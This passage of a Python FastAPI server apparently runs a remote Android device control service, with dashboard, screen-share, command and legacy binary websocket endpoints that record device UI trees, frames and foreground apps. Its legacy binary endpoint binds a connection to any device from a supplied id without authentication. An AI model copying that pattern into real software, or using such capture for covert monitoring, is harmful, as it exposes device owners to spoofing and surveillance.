                text_message = message.get("text")
                if frame is not None and role == "device":
                    if len(frame) > 2_000_000:
                        await websocket.send_json(
                            {"type": "server.error", "payload": {"code": "FRAME_TOO_LARGE"}}
                        )
                        continue
                    await hub.relay_screen_frame(session["id"], frame)
                elif text_message:
                    try:
                        payload = json.loads(text_message)
                    except ValueError:
                        continue
                    if payload.get("type") == "client.ping":
                        await websocket.send_json({"type": "server.pong", "time": utc_now()})
        except (WebSocketDisconnect, RuntimeError):
            pass
        finally:
            removed = await hub.unregister_screen(connection)
            if removed and role in {"browser", "device"}:
                reason = "browser_disconnected" if role == "browser" else "device_disconnected"
                database.execute(
                    "UPDATE screen_sessions SET status='stopped',ended_at=?,error_code=? "
                    "WHERE id=? AND status IN ('requesting','awaiting_consent','active')",
                    (utc_now(), reason.upper(), session["id"]),
                )
                peer = "device" if role == "browser" else "browser"
                await hub.notify_screen_peer(
                    session["id"],
                    peer,
                    {"type": "screen.stop", "payload": {"reason": reason}},
                )
                if role == "browser":
                    await hub.send_command(
                        session["device_id"],
                        {
                            "type": "command.dispatch",
                            "message_id": str(uuid.uuid4()),
                            "correlation_id": session["command_id"],
                            "payload": {
                                "action": "stop_screen_share",
                                "parameters": {"session_id": session["id"]},
                            },
                        },
                    )
                await hub.broadcast_dashboard(
                    {
                        "type": "screen.session.updated",
                        "session_id": session["id"],
                        "device_id": session["device_id"],
                        "status": "stopped",
                        "reason": reason,
                    },
                    session["owner_user_id"],
                )

    @app.websocket("/ws/dashboard")
    async def dashboard_websocket(websocket: WebSocket, ticket: str = Query()):
        ticket_row = database.consume_ticket(ticket, "dashboard")
        if ticket_row is None:
            await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
            return
        user = database.one("SELECT id,role,status FROM users WHERE id=?", (ticket_row["subject_id"],))
        if user is None or user["status"] != "active":
            await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
            return
        await websocket.accept()
        connection_id = await hub.register_dashboard(websocket, user["id"], user["role"])
        await websocket.send_json({"type": "server.hello", "time": utc_now()})
        try:
            while True:
                message = await websocket.receive_json()
                if message.get("type") == "client.ping":
                    await websocket.send_json({"type": "server.pong", "time": utc_now()})
        except (WebSocketDisconnect, ValueError):
            pass
        finally:
            await hub.unregister_dashboard(connection_id)

    @app.websocket("/ws/binary")
    async def legacy_binary_websocket(websocket: WebSocket):
        await websocket.accept()
        bound_device: dict[str, Any] | None = None
        sequence_no = 0
        try:
            while True:
                message = await websocket.receive()
                if message["type"] == "websocket.disconnect":
                    break
                packet = message.get("bytes")
                if packet is None or len(packet) < 5:
                    continue
                frame_type = packet[0]
                payload_length = int.from_bytes(packet[1:5], "big")
                payload = packet[5:]
                if payload_length != len(payload) or payload_length > 10 * 1024 * 1024:
                    await websocket.close(code=1009, reason="invalid binary frame")
                    return
                if frame_type == 0x30:
                    try:
                        hello = json.loads(payload.decode("utf-8"))
                    except (UnicodeDecodeError, json.JSONDecodeError):
                        await websocket.close(code=1008, reason="invalid binary hello")
                        return
                    device_id = hello.get("deviceId") if isinstance(hello, dict) else None
                    if not isinstance(device_id, str):
                        await websocket.close(code=1008, reason="missing deviceId")
                        return
                    bound_device = database.one(
                        "SELECT * FROM devices WHERE id=? OR installation_id=? LIMIT 1",
                        (device_id, device_id),
                    )
                    if bound_device is None:
                        await websocket.close(code=1008, reason="unknown device")
                        return
                    binary_connections[bound_device["id"]] = websocket
                    binary_send_locks.setdefault(bound_device["id"], asyncio.Lock())
                    merge_device_json_state(
                        "device_runtime_state",
                        bound_device["id"],
                        {
                            "binaryOnline": True,
                            "binaryApkId": hello.get("apkId"),
                            "binaryConnectedAt": utc_now(),
                        },
                    )
                    continue
                if bound_device is None:
                    await websocket.close(code=1008, reason="binary hello required")
                    return
                if frame_type not in {0x01, 0x02, 0x04, 0x07}:
                    continue
                sequence_no += 1
                now = utc_now()
                database.execute(
                    "INSERT INTO device_binary_frames(device_id,frame_type,sequence_no,payload,received_at) "
                    "VALUES(?,?,?,?,?)",
                    (bound_device["id"], frame_type, sequence_no, payload, now),
                )
                if frame_type in {0x02, 0x07}:
                    try:
                        tree_data = json.loads(payload.decode("utf-8"))
                    except (UnicodeDecodeError, json.JSONDecodeError):
                        tree_data = {"raw": payload.decode("utf-8", errors="replace")}
                    save_device_data_report(
                        bound_device["id"],
                        "binaryUiTree" if frame_type == 0x02 else "binaryAdbTree",
                        tree_data if isinstance(tree_data, dict) else {"data": tree_data},
                    )
                    tree_state: dict[str, Any] = {
                        (
                            "latestBinaryUiTree"
                            if frame_type == 0x02
                            else "latestBinaryAdbTree"
                        ): tree_data,
                        (
                            "latestBinaryUiTreeAt"
                            if frame_type == 0x02
                            else "latestBinaryAdbTreeAt"
                        ): now,
                    }
                    if frame_type == 0x02 and isinstance(tree_data, dict):
                        candidate = tree_data.get("data", tree_data)
                        if isinstance(candidate, dict):
                            tree_state["latestCapture"] = {
                                key: candidate.get(key)
                                for key in ("pkg", "ac", "w", "h", "iw", "ih", "orient")
                                if key in candidate
                            }
                            tree_state["latestCaptureAt"] = now
                    merge_device_json_state(
                        "device_runtime_state", bound_device["id"], tree_state
                    )
                elif frame_type in {0x01, 0x04}:
                    merge_device_json_state(
                        "device_runtime_state",
                        bound_device["id"],
                        {
                            (
                                "latestBinaryFrameAt"
                                if frame_type == 0x01
                                else "latestBinaryThumbnailAt"
                            ): now,
                            (
                                "latestBinaryFrameSize"
                                if frame_type == 0x01
                                else "latestBinaryThumbnailSize"
                            ): len(payload),
                        },
                    )
                session = database.one(
                    "SELECT id FROM device_stream_sessions WHERE device_id=? "
                    "AND status IN ('start_sent','active') ORDER BY started_at DESC LIMIT 1",
                    (bound_device["id"],),
                )
                if session is not None:
                    database.execute(
                        "UPDATE device_stream_sessions SET status='active' WHERE id=?",
                        (session["id"],),
                    )
                await hub.broadcast_dashboard(
                    {
                        "type": "device.binary-frame",
                        "device_id": bound_device["id"],
                        "frame_type": frame_type,
                        "sequence_no": sequence_no,
                    },
                    bound_device["owner_user_id"],
                )
        except (WebSocketDisconnect, RuntimeError):
            pass
        finally:
            if (
                bound_device is not None
                and binary_connections.get(bound_device["id"]) is websocket
            ):
                binary_connections.pop(bound_device["id"], None)
                binary_send_locks.pop(bound_device["id"], None)
                merge_device_json_state(
                    "device_runtime_state",
                    bound_device["id"],
                    {"binaryOnline": False, "binaryDisconnectedAt": utc_now()},
                )

    async def handle_status_message(
        connection: DeviceConnection,
        device: dict[str, Any],
        message: DeviceSocketMessage,
    ) -> None:
        try:
            status_body = DeviceStatusRequest.model_validate(message.payload)
        except ValueError:
            await connection.websocket.send_json(
                {
                    "type": "server.error",
                    "correlation_id": message.message_id,
                    "payload": {"code": "INVALID_STATUS"},
                }
            )
            return
        update_device_status(device["id"], status_body)
        await hub.broadcast_dashboard(
            {
                "type": "device.status",
                "device_id": device["id"],
                "status": status_body.model_dump(exclude_none=True),
            },
            device["owner_user_id"],
        )

    async def handle_command_message(
        connection: DeviceConnection | None,
        device: dict[str, Any],
        message: DeviceSocketMessage,
    ) -> bool:
        command_id = message.correlation_id
        if not command_id:
            return False
        command = database.one(
            "SELECT * FROM commands WHERE id=? AND device_id=?",
            (command_id, device["id"]),
        )
        if command is None:
            if connection is not None:
                await connection.websocket.send_json(
                    {
                        "type": "server.error",
                        "correlation_id": message.message_id,
                        "payload": {"code": "UNKNOWN_COMMAND"},
                    }
                )
            return False
        if message.type == "command.ack":
            database.execute(
                "UPDATE commands SET status='acknowledged',acknowledged_at=? "
                "WHERE id=? AND status IN ('sent','queued')",
                (utc_now(), command_id),
            )
            status_value = "acknowledged"
        else:
            success = message.payload.get("success") is True
            result = message.payload.get("result", {})
            error_code = None if success else str(message.payload.get("error_code", "DEVICE_ERROR"))[:80]
            error_message = None if success else str(message.payload.get("error_message", "command failed"))[:500]
            database.execute(
                "UPDATE commands SET status=?,completed_at=?,error_code=?,error_message=?,result_json=? WHERE id=?",
                (
                    "success" if success else "failed",
                    utc_now(),
                    error_code,
                    error_message,
                    json.dumps(result, ensure_ascii=False),
                    command_id,
                ),
            )
            status_value = "success" if success else "failed"
        await hub.broadcast_dashboard(
            {
                "type": "command.updated",
                "device_id": device["id"],
                "command_id": command_id,
                "status": status_value,
            },
            device["owner_user_id"],
        )
        return True

    async def handle_screen_status_message(
        connection: DeviceConnection,
        device: dict[str, Any],
        message: DeviceSocketMessage,
    ) -> None:
        session_id = message.payload.get("session_id")
        reported_status = message.payload.get("status")
        status_map = {
            "consent_required": "awaiting_consent",
            "active": "active",
            "denied": "denied",
            "stopped": "stopped",
            "failed": "failed",
        }
        if not isinstance(session_id, str) or reported_status not in status_map:
            await connection.websocket.send_json(
                {
                    "type": "server.error",
                    "correlation_id": message.message_id,
                    "payload": {"code": "INVALID_SCREEN_STATUS"},
                }
            )
            return
        session = database.one(
            "SELECT id FROM screen_sessions WHERE id=? AND device_id=?",
            (session_id, device["id"]),
        )
        if session is None:
            await connection.websocket.send_json(
                {
                    "type": "server.error",
                    "correlation_id": message.message_id,
                    "payload": {"code": "UNKNOWN_SCREEN_SESSION"},
                }
            )
            return
        stored_status = status_map[reported_status]
        now = utc_now()
        consented_at = now if stored_status == "active" else None
        ended_at = now if stored_status in {"denied", "stopped", "failed"} else None
        error_code = message.payload.get("error_code") if stored_status == "failed" else None
        error_message = (
            str(message.payload.get("error_message", ""))[:500]
            if stored_status == "failed"
            else None
        )
        database.execute(
            "UPDATE screen_sessions SET status=?,consented_at=coalesce(?,consented_at),"
            "ended_at=?,error_code=?,error_message=? WHERE id=?",
            (
                stored_status,
                consented_at,
                ended_at,
                str(error_code)[:80] if error_code else None,
                error_message,
                session_id,
            ),
        )
        event = {
            "type": "screen.session.updated",
            "session_id": session_id,
            "device_id": device["id"],
            "status": stored_status,
        }
        await hub.broadcast_dashboard(event, device["owner_user_id"])
        await hub.notify_screen_peer(session_id, "browser", event)

    @app.websocket("/ws/device")
    async def device_websocket(websocket: WebSocket, ticket: str = Query()):
        ticket_row = database.consume_ticket(ticket, "device")
        if ticket_row is None:
            await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
            return
        device = database.one("SELECT * FROM devices WHERE id=?", (ticket_row["subject_id"],))
        if device is None:
            await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
            return
        await websocket.accept()
        session_id = str(uuid.uuid4())
        connection, previous = await hub.register_device(
            device["id"], websocket, session_id
        )
        now = utc_now()

        def connect_device(conn: sqlite3.Connection):
            if previous is not None:
                conn.execute(
                    "UPDATE device_sessions SET disconnected_at=?, "
                    "disconnect_reason='replaced_by_new_session' "
                    "WHERE id=? AND disconnected_at IS NULL",
                    (now, previous.session_id),
                )
            conn.execute(
                "INSERT INTO device_sessions(id,device_id,socket_id,connected_at,last_heartbeat_at) "
                "VALUES(?,?,?,?,?)",
                (session_id, device["id"], connection.socket_id, now, now),
            )
            conn.execute(
                "UPDATE device_status SET online=1,updated_at=? WHERE device_id=?",
                (now, device["id"]),
            )
            conn.execute(
                "UPDATE devices SET last_seen_at=?,updated_at=? WHERE id=?",
                (now, now, device["id"]),
            )

        database.transaction(connect_device)
        await websocket.send_json(
            {
                "type": "server.hello",
                "message_id": str(uuid.uuid4()),
                "payload": {
                    "protocol_version": 1,
                    "heartbeat_interval_seconds": min(
                        30, max(10, settings.device_offline_after_seconds // 3)
                    ),
                },
            }
        )
        await hub.broadcast_dashboard(
            {"type": "device.online", "device_id": device["id"], "time": now},
            device["owner_user_id"],
        )
        try:
            while True:
                raw = await websocket.receive_json()
                try:
                    message = DeviceSocketMessage.model_validate(raw)
                except ValueError:
                    await websocket.send_json(
                        {"type": "server.error", "payload": {"code": "INVALID_MESSAGE"}}
                    )
                    continue
                await hub.touch(connection)
                heartbeat_time = utc_now()
                database.execute(
                    "UPDATE device_sessions SET last_heartbeat_at=? WHERE id=?",
                    (heartbeat_time, session_id),
                )
                database.execute(
                    "UPDATE devices SET last_seen_at=?,updated_at=? WHERE id=?",
                    (heartbeat_time, heartbeat_time, device["id"]),
                )
                if message.type in {"device.hello", "device.heartbeat"}:
                    await websocket.send_json(
                        {
                            "type": "server.pong",
                            "correlation_id": message.message_id,
                            "payload": {"time": heartbeat_time},
                        }
                    )
                elif message.type in {"device.status", "deviceOnline", "diag"}:
                    await handle_status_message(connection, device, message)
                elif message.type in {"command.ack", "command.result"}:
                    if message.type == "command.result":
                        try:
                            message, _ = normalize_command_result(message)
                        except LegacyProtocolError as exc:
                            await websocket.send_json(
                                {
                                    "type": "server.error",
                                    "correlation_id": message.message_id,
                                    "payload": {
                                        "code": "INVALID_COMMAND_RESULT",
                                        "message": str(exc),
                                    },
                                }
                            )
                            continue
                    await handle_command_message(connection, device, message)
                elif message.type in ANDROID_SELF_REPORT_TYPES:
                    try:
                        normalized_report, _ = normalize_android_self_report(message)
                    except LegacyProtocolError as exc:
                        await websocket.send_json(
                            {
                                "type": "server.error",
                                "correlation_id": message.message_id,
                                "payload": {
                                    "code": "INVALID_ANDROID_SELF_REPORT",
                                    "message": str(exc),
                                },
                            }
                        )
                        continue
                    await handle_command_message(
                        connection, device, normalized_report
                    )
                elif message.type == "screen.session.status":
                    await handle_screen_status_message(connection, device, message)
        except (WebSocketDisconnect, ValueError):
            pass
        finally:
            await mark_disconnected(connection, "socket_closed")

    app.state.socketio_server = sio
    app.state.asgi_app = socketio.ASGIApp(sio, other_asgi_app=app)
    return app


fastapi_app = create_app()
app = fastapi_app.state.asgi_app
